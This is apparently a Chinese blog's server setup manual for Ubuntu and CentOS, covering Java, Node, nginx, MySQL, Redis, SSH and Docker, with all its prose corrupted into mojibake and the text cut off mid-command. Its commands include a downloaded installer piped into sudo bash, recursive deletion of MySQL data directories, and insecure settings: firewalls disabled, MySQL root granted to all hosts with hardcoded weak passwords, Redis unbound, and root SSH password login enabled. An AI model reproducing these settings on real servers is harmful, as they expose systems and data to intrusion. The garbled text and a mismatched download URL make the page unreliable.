    <content><![CDATA[<h1 id="é¡¹ç›®æ­å»ºæ‰‹å†Œ"><a href="#é¡¹ç›®æ­å»ºæ‰‹å†Œ" class="headerlink" title="é¡¹ç›®æ­å»ºæ‰‹å†Œ"></a>é¡¹ç›®æ­å»ºæ‰‹å†Œ</h1><h1 id="Ubuntu20"><a href="#Ubuntu20" class="headerlink" title="Ubuntu20"></a>Ubuntu20</h1><h2 id="è®¾ç½®rootå¯†ç "><a href="#è®¾ç½®rootå¯†ç " class="headerlink" title="è®¾ç½®rootå¯†ç "></a>è®¾ç½®rootå¯†ç </h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…openjdk8"><a href="#å®‰è£…openjdk8" class="headerlink" title="å®‰è£…openjdk8"></a>å®‰è£…openjdk8</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br><span class="line"></span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<h2 id="æ‰‹åŠ¨ä¸‹è½½å‹ç¼©åŒ…å®‰è£…oracle-jdk8"><a href="#æ‰‹åŠ¨ä¸‹è½½å‹ç¼©åŒ…å®‰è£…oracle-jdk8" class="headerlink" title="æ‰‹åŠ¨ä¸‹è½½å‹ç¼©åŒ…å®‰è£…oracle jdk8"></a>æ‰‹åŠ¨ä¸‹è½½å‹ç¼©åŒ…å®‰è£…oracle jdk8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /usr/lib/jvm</span><br><span class="line">sudo tar -zxvf jdk-8u162-linux-x64.tar.gz -C /usr/lib/jvm</span><br><span class="line">sudo vim ~/.bashrc</span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">set</span> oracle jdk environment</span></span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_162  ## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre  </span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  </span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH  </span><br><span class="line"></span><br><span class="line">source ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_162/bin/java 300</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰è£…äº†å¤šä¸ªç‰ˆæœ¬çš„jdkï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤åœ¨è¿™äº›ç‰ˆæœ¬ä¹‹é—´åˆ‡æ¢</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å‰é¢å¸¦æ˜Ÿå·çš„æ˜¯å½“å‰æ­£åœ¨ä½¿ç”¨çš„javaç‰ˆæœ¬ï¼Œé”®å…¥ç¼–å·é€‰æ‹©ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬ã€‚</span></span><br><span class="line">sudo update-alternatives â€“config java</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…å®å¡”é¢æ¿"><a href="#å®‰è£…å®å¡”é¢æ¿" class="headerlink" title="å®‰è£…å®å¡”é¢æ¿"></a>å®‰è£…å®å¡”é¢æ¿</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh 5d238b</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…node-js"><a href="#å®‰è£…node-js" class="headerlink" title="å®‰è£…node.js"></a>å®‰è£…node.js</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://nodejs.org/dist/v12.18.3/node-v14.16.0-linux-x64.tar.xz    <span class="comment"># ä¸‹è½½</span></span><br><span class="line">tar xf node-v14.16.0-linux-x64.tar.xz                                  <span class="comment"># è§£å‹</span></span><br><span class="line"><span class="built_in">cd</span> node-v14.16.0-linux-x64                                              <span class="comment"># è¿›å…¥è§£å‹ç›®å½•</span></span><br><span class="line"><span class="built_in">cp</span> /etc/profile /etc/profile.bak</span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/root/node-v14.16.0-linux-x64/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">node -v</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org <span class="comment"># ä½¿ç”¨æ·˜å®é•œåƒ</span></span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…vue-cli"><a href="#å®‰è£…vue-cli" class="headerlink" title="å®‰è£…vue-cli"></a>å®‰è£…vue-cli</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cnpm install -g vue-cli</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…nginx"><a href="#å®‰è£…nginx" class="headerlink" title="å®‰è£…nginx"></a>å®‰è£…nginx</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br><span class="line">nginx -v</span><br><span class="line"><span class="built_in">cd</span> /etc/nginx/conf.d</span><br><span class="line">sudo vi leyou.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.leyou.com;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.leyou.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://manage.leyou.com:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name  www.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">        root  /root/leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">                <span class="comment"># æºå¸¦hostsåœ°å€ï¼Œé¿å…å› ä»£ç†å¯¼è‡´hostä¸¢å¤±</span></span><br><span class="line">            proxy_set_header Host       <span class="variable">$host</span>;</span><br><span class="line">            proxy_pass   http://ly-linux;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service nginx start</span><br></pre></td></tr></table></figure>

<p>nginxæ–‡ä»¶å®‰è£…å®Œæˆä¹‹åçš„æ–‡ä»¶ä½ç½®ï¼š</p>
<ul>
<li>&#x2F;usr&#x2F;sbin&#x2F;nginxï¼šä¸»ç¨‹åº</li>
<li>&#x2F;etc&#x2F;nginxï¼šå­˜æ”¾é…ç½®æ–‡ä»¶</li>
<li>&#x2F;usr&#x2F;share&#x2F;nginxï¼šå­˜æ”¾é™æ€æ–‡ä»¶</li>
<li>&#x2F;var&#x2F;log&#x2F;nginxï¼šå­˜æ”¾æ—¥å¿—</li>
</ul>
<h2 id="é€šè¿‡jaråŒ…å¯åŠ¨æœåŠ¡"><a href="#é€šè¿‡jaråŒ…å¯åŠ¨æœåŠ¡" class="headerlink" title="é€šè¿‡jaråŒ…å¯åŠ¨æœåŠ¡"></a>é€šè¿‡jaråŒ…å¯åŠ¨æœåŠ¡</h2><p>å°†10ä¸ªjaråŒ…æ”¾åˆ°&#x2F;root&#x2F;leyou</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo -u springboot <span class="built_in">nohup</span> /usr/bin/java -jar /www/wwwroot/ly-gateway-1.0-SNAPSHOT.jar --server.port=10010  &gt;&gt; /tmp/AA1NI23EAG.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">sudo -u springboot <span class="built_in">nohup</span> /usr/bin/java -jar /www/wwwroot/ly-auth-service-1.0-SNAPSHOT.jar --server.port=8082 &gt;&gt; /tmp/U2XZXIUSO1.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ubuntu-æ‰§è¡Œ-sudo-apt-get-update-è¦å¾ˆä¹…-è§£å†³æ–¹æ³•"><a href="#ubuntu-æ‰§è¡Œ-sudo-apt-get-update-è¦å¾ˆä¹…-è§£å†³æ–¹æ³•" class="headerlink" title="ubuntu æ‰§è¡Œ sudo apt-get update è¦å¾ˆä¹… è§£å†³æ–¹æ³•"></a>ubuntu æ‰§è¡Œ sudo apt-get update è¦å¾ˆä¹… è§£å†³æ–¹æ³•</h2><p>æ‰“å¼€åº”ç”¨é¡µ è½¯ä»¶å’Œæ›´æ–°ä¿®æ”¹ubuntuè½¯ä»¶ä¸‹è½½æºä¸ºustc</p>
<h2 id="ubuntu20-04å®‰è£…ä¸å¸è½½mysql5-7"><a href="#ubuntu20-04å®‰è£…ä¸å¸è½½mysql5-7" class="headerlink" title="ubuntu20.04å®‰è£…ä¸å¸è½½mysql5.7"></a>ubuntu20.04å®‰è£…ä¸å¸è½½mysql5.7</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt install libaio1 libtinfo5 libmecab2 libjson-perl python2 python2.7</span><br><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-5.7/mysql-server_5.7.31-1ubuntu18.04_amd64.deb-bundle.tar</span><br><span class="line">tar xvf mysql-server_5.7.31-1ubuntu18.04_amd64.deb-bundle.tar</span><br><span class="line">rm -f mysql-testsuite_5.7.31-1ubuntu18.04_amd64.deb</span><br><span class="line">rm -f mysql-community-test_5.7.31-1ubuntu18.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-common_5.7.31-1ubuntu18.04_amd64.deb</span><br><span class="line">sudo dpkg -i lib*.deb </span><br><span class="line">sudo dpkg -i mysql-*.deb</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½</span></span><br><span class="line">sudo apt-get autoremove --purge mysql-server </span><br><span class="line">sudo apt-get remove mysql-common</span><br><span class="line">sudo rm -rf /etc/mysql/ /var/lib/mysql</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ¸…ç†æ®‹ç•™æ•°æ®</span></span><br><span class="line">dpkg -l | grep ^rc| awk &#x27;&#123;print $2&#125;&#x27; | sudo xargs dpkg -P</span><br><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt autoclean</span><br></pre></td></tr></table></figure>

<h2 id="Mysql-ubuntu-å¼€å¯3306ç«¯å£ï¼Œè®¾ç½®è¿œç¨‹è®¿é—®"><a href="#Mysql-ubuntu-å¼€å¯3306ç«¯å£ï¼Œè®¾ç½®è¿œç¨‹è®¿é—®" class="headerlink" title="Mysql ubuntu å¼€å¯3306ç«¯å£ï¼Œè®¾ç½®è¿œç¨‹è®¿é—®"></a>Mysql ubuntu å¼€å¯3306ç«¯å£ï¼Œè®¾ç½®è¿œç¨‹è®¿é—®</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">mysql5</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;asdfghjkl&#x27;</span> WITH GRANT OPTION;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">mysql8</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED WITH mysql_native_password BY<span class="string">&#x27;asdfghjkl&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">grant all privileges on *.* to <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä½ æƒ³å…è®¸ç”¨æˆ·jackä»ipä¸º10.10.50.127çš„ä¸»æœºè¿æ¥åˆ°mysqlæœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨654321ä½œä¸ºå¯†ç </span></span><br><span class="line"><span class="meta">xinximysql&gt;</span><span class="language-bash">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;jack&#x27;</span>@â€™10.10.50.127â€™ IDENTIFIED BY <span class="string">&#x27;654321&#x27;</span> WITH GRANT OPTION;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹mysqlæ•°æ®åº“ä¸­çš„userè¡¨ä½¿ç›¸åº”çš„ç”¨æˆ·èƒ½ä»æŸä¸€ä¸»æœºç™»é™†</span></span><br><span class="line">mysql -u root â€“p</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">use mysql;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">update user <span class="built_in">set</span> host = <span class="string">&#x27;%&#x27;</span> <span class="built_in">where</span> user = <span class="string">&#x27;root&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">select host, user from user;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­é˜²ç«å¢™</span></span><br><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw status</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹MySQLçš„é…ç½®æ–‡ä»¶</span></span><br><span class="line">vi /etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line"><span class="meta">#</span><span class="language-bash">bind-address = 127.0.0.1</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">service mysql restart</span><br></pre></td></tr></table></figure>

<h2 id="Ubuntuå®‰è£…redis"><a href="#Ubuntuå®‰è£…redis" class="headerlink" title="Ubuntuå®‰è£…redis"></a>Ubuntuå®‰è£…redis</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install redis-server</span><br><span class="line">sudo vi /etc/redis/redis.conf</span><br><span class="line">requirepass hzlarm</span><br><span class="line"></span><br><span class="line">æ³¨é‡Šæ‰ç»‘å®šåœ°å€#bind 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Redisä»¥å®ˆæŠ¤è¿›ç¨‹è¿è¡Œ</p>
<ul>
<li>å¦‚æœä»¥å®ˆæŠ¤è¿›ç¨‹è¿è¡Œï¼Œåˆ™ä¸ä¼šåœ¨å‘½ä»¤è¡Œé˜»å¡ï¼Œç±»ä¼¼äºæœåŠ¡</li>
<li>å¦‚æœä»¥éå®ˆæŠ¤è¿›ç¨‹è¿è¡Œï¼Œåˆ™å½“å‰ç»ˆç«¯è¢«é˜»å¡ï¼Œæ— æ³•ä½¿ç”¨</li>
<li>æ¨èæ”¹ä¸ºyesï¼Œä»¥å®ˆæŠ¤è¿›ç¨‹è¿è¡Œ<br><code>daemonize no|yes</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service redis-server restart</span><br></pre></td></tr></table></figure>

<h2 id="macé€šè¿‡shellè¿æ¥ubuntu20-04"><a href="#macé€šè¿‡shellè¿æ¥ubuntu20-04" class="headerlink" title="macé€šè¿‡shellè¿æ¥ubuntu20.04"></a>macé€šè¿‡shellè¿æ¥ubuntu20.04</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨ubuntuä¸Šå®‰è£…openssh-server</span></span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="language-bash">PermitRootLogin without-password</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿›å…¥rootæ–‡ä»¶å¤¹éœ€è¦è¾“å…¥rootå¯†ç </span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­é˜²ç«å¢™</span></span><br><span class="line">sudo ufw disable</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯sshæœåŠ¡</span></span><br><span class="line">sudo /etc/init.d/ssh restart</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>

<h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><h2 id="å®‰è£…jdk8"><a href="#å®‰è£…jdk8" class="headerlink" title="å®‰è£…jdk8"></a>å®‰è£…jdk8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æ–¹æ³•ä¸€</span></span><br><span class="line">cd /opt/module</span><br><span class="line">mkdir java</span><br><span class="line">cd java</span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/java</span><br><span class="line"> </span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/module/java/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ–¹æ³•äºŒ</span></span><br><span class="line">yum install java-1.8.0-openjdk</span><br></pre></td></tr></table></figure>

<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install openssh-server</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="language-bash">PermitRootLogin without-password</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿›å…¥rootæ–‡ä»¶å¤¹éœ€è¦è¾“å…¥rootå¯†ç </span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>

<h3 id="SSHè¿æ¥å¤±è´¥ï¼ŒæŠ¥é”™Host-key-verification-failedâ€”â€”åŸç†å’Œè§£å†³æ–¹æ³•"><a href="#SSHè¿æ¥å¤±è´¥ï¼ŒæŠ¥é”™Host-key-verification-failedâ€”â€”åŸç†å’Œè§£å†³æ–¹æ³•" class="headerlink" title="SSHè¿æ¥å¤±è´¥ï¼ŒæŠ¥é”™Host key verification failedâ€”â€”åŸç†å’Œè§£å†³æ–¹æ³•"></a>SSHè¿æ¥å¤±è´¥ï¼ŒæŠ¥é”™Host key verification failedâ€”â€”åŸç†å’Œè§£å†³æ–¹æ³•</h3><ul>
<li><p>ç›´æ¥å°†&#x2F;root&#x2F;.ssh&#x2F;known_hosts æ–‡ä»¶åˆ é™¤å³å¯ã€‚æˆ–è€…ä½ å°†å¯¹åº”çš„è®°å½•åˆ é™¤å³å¯ï¼ˆæ ¹æ®ipæŸ¥å°±è¡Œï¼‰ã€‚ä¹‹åå†æ¬¡sshè¿æ¥ã€‚</p>
</li>
<li><p>vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config  #ä¿®æ”¹ä¸‹æ–¹é€‰é¡¹ï¼Œåˆ™ä¸å†æ ¡éªŒæœåŠ¡ç«¯ä¸»æœºèº«ä»½ï¼Œè¾“å…¥è´¦å·å¯†ç ç›´æ¥è¿æ¥ã€‚æ³¨æ„è¿™ä¸ªä¸å»ºè®®ä½¿ç”¨ï¼Œä¸å®‰å…¨ã€‚StrictHostKeyChecking&#x3D;no</p>
</li>
</ul>
<h2 id="æ›´æ–°yumæº"><a href="#æ›´æ–°yumæº" class="headerlink" title="æ›´æ–°yumæº"></a>æ›´æ–°yumæº</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">å¤‡ä»½åŸæ¥çš„yumæº</span></span><br><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸‹è½½163yumæºé…ç½®</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ¸…ç©ºyumç¼“å­˜</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç”Ÿæˆç¼“å­˜</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<h2 id="è®¾ç½®é™æ€ip"><a href="#è®¾ç½®é™æ€ip" class="headerlink" title="è®¾ç½®é™æ€ip"></a>è®¾ç½®é™æ€ip</h2><p>é¦–å…ˆè¿›å…¥ç½‘ç»œé…ç½®çš„ç›®å½•ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥ç½‘ç»œé…ç½®çš„ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> /etc/sysconfig/network-scripts/</span><br><span class="line">vi ifcfg-*</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR0=10.211.55.100</span><br><span class="line">PREFIX0=24</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=10.211.55.1</span><br><span class="line">DNS1=119.29.29.29</span><br><span class="line"></span><br><span class="line">systemctl restart network.service</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment">#å®é™…å¼€å‘ä¸­ä¸èƒ½å…³é—­é˜²ç«å¢™ï¼Œè€Œæ˜¯å¼€å¯æŸå‡ ä¸ªç«¯å£</span></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…mysql5-7"><a href="#å®‰è£…mysql5-7" class="headerlink" title="å®‰è£…mysql5.7"></a>å®‰è£…mysql5.7</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</span><br><span class="line">yum localinstall mysql57-community-release-el7-11.noarch.rpm</span><br><span class="line">yum install -y mysql-community-server</span><br><span class="line">systemctl start mysqld</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¼€æœºè‡ªå¯</span></span><br><span class="line">systemctl enable mysqld</span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡è½½æ‰€æœ‰ä¿®æ”¹è¿‡çš„é…ç½®æ–‡ä»¶</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Ycbaby000623.&#x27;; </span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;Ycbaby000623.&#x27; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">vi /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">server-id=1000</span><br><span class="line"></span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart mysqld</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chkconfig iptables off</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>



<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y docker</span><br><span class="line">docker --version #å‡ºç°ç‰ˆæœ¬å·å³ä¸ºå®‰è£…æˆåŠŸ</span><br><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;:[&quot;https://1nj0zren.mirror.aliyuncs.com&quot;,</span><br><span class="line">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">        &quot;http://f1361db2.m.daocloud.io&quot;,</span><br><span class="line">        &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">                &quot;https://hub-mirror.c.163.com/&quot;],</span><br><span class="line">&quot;insecure-registries&quot;:[&quot;10.211.55.33:5000&quot;]</span><br><span class="line">&#125;</span><br><span class="line">systemctl restart docker.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…docker-compose"><a href="#å®‰è£…docker-compose" class="headerlink" title="å®‰è£…docker-compose"></a>å®‰è£…docker-compose</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æ–¹æ¡ˆä¸€</span></span><br><span class="line">yum install docker-compose</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ–¹æ¡ˆäºŒ</span></span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.12.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">docker-compose version # æŸ¥çœ‹ç‰ˆæœ¬å·ï¼Œæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<h3 id="dockerå¸¸ç”¨å‘½ä»¤"><a href="#dockerå¸¸ç”¨å‘½ä»¤" class="headerlink" title="dockerå¸¸ç”¨å‘½ä»¤"></a>dockerå¸¸ç”¨å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker start  # å¯åŠ¨dockeræœåŠ¡</span><br><span class="line">service docker stop  # åœæ­¢dockeræœåŠ¡</span><br><span class="line">service docker restart  # é‡å¯dockeræœåŠ¡</span><br><span class="line">docker build # æ„å»ºé•œåƒ</span><br><span class="line">docker images # æŸ¥çœ‹é•œåƒ</span><br><span class="line">docker rmi # åˆ é™¤é•œåƒ</span><br><span class="line">docker search # åˆ°ä»“åº“æœç´¢é•œåƒ</span><br><span class="line">docker push # æäº¤é•œåƒåˆ°ä»“åº“</span><br><span class="line">docker pull # ä»ä»“åº“æ‹‰å–é•œåƒ</span><br><span class="line">docker save # ä¿å­˜é•œåƒ</span><br><span class="line">docker load # åŠ è½½æœ¬åœ°é•œåƒ</span><br><span class="line"></span><br><span class="line">docker run/exec/attach # è¿è¡Œé•œåƒã€è¿›å…¥å·²ç»å¯åŠ¨é•œåƒ</span><br><span class="line">docker stop # åœæ­¢é•œåƒ</span><br><span class="line">docker kill #stopç”¨ä¸äº†å°±ç”¨è¿™ä¸ª</span><br><span class="line">docker start # å¯åŠ¨é•œåƒ</span><br><span class="line">docker pause # æš‚åœé•œåƒ</span><br><span class="line">docker unpause # æ¢å¤é•œåƒ</span><br><span class="line">docker ps # æŸ¥çœ‹è¿è¡Œä¸­çš„é•œåƒ</span><br><span class="line">docker rm # åˆ é™¤è¿è¡Œä¸­çš„é•œåƒ</span><br><span class="line">docker inspect å®¹å™¨id #æŸ¥çœ‹å®¹å™¨ä¿¡æ¯</span><br><span class="line">docker logs -f canal #æŸ¥çœ‹æ—¥å¿—</span><br><span class="line">docker search centos #æœç´¢</span><br><span class="line">docker tag centos test_centos2:171104 #æ‰“æ ‡ç­¾,è¿™ä¸¤ä¸ªé•œåƒä½¿ç”¨çš„IMAGE IDæ˜¯ä¸€æ 